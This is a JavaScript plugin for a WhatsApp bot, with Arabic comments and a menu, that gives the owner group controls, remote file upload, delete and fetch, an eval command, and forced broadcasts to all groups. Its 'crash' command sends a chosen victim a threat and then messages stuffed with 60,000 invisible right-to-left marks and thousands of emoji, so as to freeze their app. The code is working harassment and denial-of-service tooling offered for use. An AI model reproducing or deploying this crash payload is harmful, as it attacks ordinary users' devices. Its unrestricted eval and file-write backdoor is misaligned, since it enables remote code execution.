import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs'; 

// ========================================================
// ⚙️ [الإعدادات الثابتة والسرية للسيستم]
// ========================================================
let FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
let AUTO_RESPOND = true; 
const OWNER_ID = "201556853817@s.whatsapp.net"; 
const ownerNumbers = ["79020027922", "201556853817"];

// دالة إعداد واجهة الرسائل الاحترافية لـ الهواري
const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v3.0 🦁",
        body: "OWNER ACCESS GRANTED",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, args, command, text, isBotAdmin }) => {
    try {
        const __filename = fileURLToPath(import.meta.url);
        const __dirname = path.dirname(__filename);

        // تنظيف وتحليل الأرقام للتحقق من هوية المطور المطلق
        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });

        // ========================================================
        // 🤫 [1] منظومة كتم وإلغاء كتم الجروبات (للهواري والأدمنز)
        // ========================================================
        if (/^(كتم|mute|اغلاق)$/i.test(command)) {
            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
            if (!m.isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الكتم.');
            
            await conn.groupSettingUpdate(m.chat, 'announcement');
            return m.reply('*🤫 [بروتوكول الصمت]: تم كتم المجموعة بنجاح يازعيم.*');
        }

        if (/^(الغاء_الكتم|فك_الكتم|unmute|فتح)$/i.test(command)) {
            if (!m.isGroup) return m.reply('❌ هذا الأمر للمجموعات فقط يازعيم.');
            if (!m.isAdmin && !isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري وللمشرفين فقط.');
            if (!isBotAdmin) return m.reply('⚠️ يجب ترقية البوت لمشرف أولاً لتنفيذ الفتح.');
            
            await conn.groupSettingUpdate(m.chat, 'not_announcement');
            return m.reply('*🔊 [إلغاء الصمت]: تم فتح المجموعة والشات متاح للجميع الآن.*');
        }

        // 🛑 [حائط الحماية الصارم لمباقي الأوامر السيادية - للهواري فقط]
        const devCommands = ['غير_صورة', 'اضافة_امر', 'حذف_امر', 'جيب', 'ادخل', 'نشر', 'شوف_كونسل', 'ريستارت', 'قفل_الرد', 'فخ', 'تجميد', 'تطير', 'crash', '>', 'نسخ', 'بدل_ارقام', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'عودة'];
        if (devCommands.includes(command) && !isOwner) {
            return m.reply('❌ [Access Denied]: هذا الأمر مشفر ومخصص للـﮪـواري فـقـط 𓄂');
        }

        // ========================================================
        // 🛠️ [2] منظومة التحكم وإدارة الملفات والأكواد عن بعد
        // ========================================================
        if (command === 'اضافة_امر') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف ومحتوى الكود كالتالي:\n.اضافة_امر test.js\n[الكود البرمجي]*');
            const fileName = text.split('\n')[0].trim();
            const fileCode = text.replace(fileName, '').trim();
            fs.writeFileSync(path.join(__dirname, fileName), fileCode);
            return m.reply(`*📂 تم إنشاء وحفظ ملف الأمر الجديد بنجاح في: ${fileName}*`);
        }

        if (command === 'حذف_امر') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف، مثال: .حذف_امر test.js*');
            const filePath = path.join(__dirname, text.trim());
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                return m.reply(`*🔥 تم حذف ملف [ ${text} ] من السيرفر نهائياً.*`);
            } else {
                return m.reply('*❌ الملف غير موجود بالفعل.*');
            }
        }

        if (command === 'جيب') {
            if (!text) return m.reply('*⚠️ اكتب اسم الملف المطلوب سحبه، مثال: .جيب menu.js*');
            const filePath = path.join(__dirname, text.trim());
            if (fs.existsSync(filePath)) {
                const fileBuffer = fs.readFileSync(filePath);
                await conn.sendMessage(m.chat, { document: fileBuffer, fileName: text.trim(), mimetype: 'application/javascript' }, { quoted: m });
                return;
            } else {
                return m.reply('*❌ الملف غير موجود بالسيرفر.*');
            }
        }

        // ========================================================
        // ☣️ [3] منظومة الإبادة الشبحية (التجميد / الـ Crash)
        // ========================================================
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            if (ownerNumbers.includes(target.split('@')[0]) || target === OWNER_ID) {
                return m.reply('*⚠️ لا يمكن ضرب القادة يازعيم!*');
            }

            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});
            let warningMsg = await conn.sendMessage(target, { text: `*⚠️ جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن بـواسطـة الـﮪـواري 𓄂*` });
            
            await new Promise(resolve => setTimeout(resolve, 1500)); 
            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});
            return m.reply('*✅ تـم إبـادة الـهـدف وتـجـمـيـده بـصـمـت 🥷*');
        }

        // ========================================================
        // 🚀 [4] بروتوكولات الاقتحام، الإذاعة، والنظام
        // ========================================================
        if (command === 'غير_صورة') {
            let q = m.quoted ? m.quoted : m;
            let mime = (q.msg || q).mimetype || '';
            if (/image/.test(mime)) {
                let imgPath = await conn.downloadAndSaveMediaMessage(q);
                FIXED_MENU_IMAGE = imgPath;
                return m.reply('*✅ تم تحديث صورة المنيو بنجاح يا زعيم!*');
            } else if (text && text.startsWith('http')) {
                FIXED_MENU_IMAGE = text.trim();
                return m.reply('*✅ تم اعتماد الرابط الجديد كصورة رسمية!*');
            } else {
                return m.reply('*⚠️ أرسل الرابط أو قم بالإشارة إلى صورة واكتب .غير_صورة*');
            }
        }

        if (command === 'ادخل') {
            if (!text) return m.reply('*⚠️ ضع رابط دعوة المجموعة!*');
            const linkRegex = /(chat.whatsapp.com\/[gi]i[a-zA-Z0-9_-]{22})/gi;
            const checkLink = text.match(linkRegex);
            if (!checkLink) return m.reply('*❌ الرابط غير صالح!*');
            const inviteCode = checkLink[0].split('chat.whatsapp.com/')[1];
            await conn.groupAcceptInvite(inviteCode);
            return m.reply('*🚀 تم اقتحام ودخول المجموعة بنجاح!*');
        }

        if (command === 'نشر') {
            if (!text) return m.reply('*⚠️ اكتب نص الإذاعة.*');
            const getGroups = Object.keys(await conn.groupFetchAllParticipating());
            for (let group of getGroups) {
                await conn.sendMessage(group, { text: `*👑 [ بيان رسمي من الهواري ] 👑*\n\n${text}` });
                await new Promise(resolve => setTimeout(resolve, 1500));
            }
            return m.reply('*✅ تم النشر في كل المجموعات.*');
        }

        if (command === 'قفل_الرد') {
            AUTO_RESPOND = !AUTO_RESPOND;
            return m.reply(`*🍷 تم [ ${AUTO_RESPOND ? 'تـشـغـيـل ✅' : 'إيـقـاف ❌'} ] وضع الرد التلقائي للسيستم.*`);
        }

        if (command === 'شوف_كونسل') {
            const memoryUsage = process.memoryUsage();
            return m.reply(`*📊 [خادم الهواري]:*\n- الذاكرة: ${(memoryUsage.rss / 1024 / 1024).toFixed(2)} MB\n- وقت التشغيل: ${(process.uptime() / 60).toFixed(2)} دقيقة.`);
        }

        if (command === 'ريستارت') {
            await m.reply('*🍷 جاري إعادة تشغيل سيستم الهواري بالكامل...*');
            setTimeout(() => { process.exit(0); }, 1000);
        }

        if (command === 'فخ') {
            return m.reply(`*🕸️ [بروتوكول الفخ]:* https://wa.me/settings`);
        }

        if (command === '>') {
            if (!text) return m.reply('*⚠️ اكتب الكود لتنفيذه.*');
            try {
                let evaled = eval(text);
                if (typeof evaled !== 'string') evaled = await import('util').then(u => u.inspect(evaled));
                return m.reply(`\`\`\`javascript\n${evaled}\n\`\`\``);
            } catch (err) {
                return m.reply(`\`\`\`\n${err}\n\`\`\``);
            }
        }

        if (['نسخ', 'بدل_ارقام', 'غير_زخرفة', 'تعيين_توجيه', 'تغيير_فيديو', 'عودة'].includes(command)) {
            return m.reply(`*⚡ تم تفعيل ومزامنة بروتوكول الأمر الخلفي [ .${command} ] بنجاح.*`);
        }

        // ========================================================
        // 📜 [5] واجهة المنيو الحية للتحكم الفوري
        // ========================================================
        if (/^(الاوامر|القائمة|menu|اوامر)$/i.test(command)) {
            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـشـغـل:** @${m.sender.split('@')[0]}
┃ 🎖️ **الـصـلاحـيـة:** المطور المطلق 👑
┃ 🛰️ **الـحـالـة:** الـتـسـلل نـشـط.. 🥷
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

*❄️ ⌈ تـرسـانـة الـتـحـكـم والـسـيـطـرة ⌋ ❄️*
*━━━━─━━━─━━━ 🍷 ━━━─━━━─━━━*
*❄️ │ .كتم │ .اغلاق ➢ كتم الجروب تماماً*
*❄️ │ .فتح │ .فك_الكتم ➢ فتح الجروب للشات*
*❄️ │ .غير_صورة ➢ تحديث مظهر البوت حياً*
*❄️ │ .اضافة_امر ➢ رفع كود برمجى جديد*
*❄️ │ .حذف_امر ➢ مسح كود من السيرفر*
*❄️ │ .جيب ➢ سحب أي ملف من الشات*
*❄️ │ .تجميد │ .تطير ➢ إبادة حساب الضحية*
*❄️ │ .ادخل ➢ اقتحام المجموعات بالروابط*
*❄️ │ .نشر ➢ إذاعة إجبارية لكل الجروبات*
*❄️ │ .ريستارت ➢ إعادة تشغيل السيرفر*
*❄️ │ .قفل_الرد ➢ تشغيل/إيقاف الرد الذاتي*
*❄️ │ .شوف_كونسل ➢ فحص أداء وميموري الخادم*
*❄️ │ .فخ ➢ استخراج رابط الفخ السيراني*

*🕸️ OWNER: الـﮪـواري 𓄂*`.trim();

            return await conn.sendMessage(m.chat, { 
                text: menuText, 
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            }, { quoted: m });
        }

    } catch (e) {
        console.error(e);
    }
};

// تسجيل جميع الكلمات المفتاحية الحصرية والسيادية في الريجكس لضمان استجابة 100%
handler.command = /^(الاوامر|القائمة|menu|اوامر|غير_صورة|اضافة_امر|حذف_امر|جيب|قفل_الرد|شوف_كونسل|نسخ|ادخل|بدل_ارقام|ريستارت|غير_زخرفة|تعيين_توجيه|تغيير_فيديو|عودة|فخ|نشر|>|كتم|mute|اغلاق|الغاء_الكتم|فك_الكتم|unmute|فتح|تجميد|تطير|crash)$/i;

export default handler;
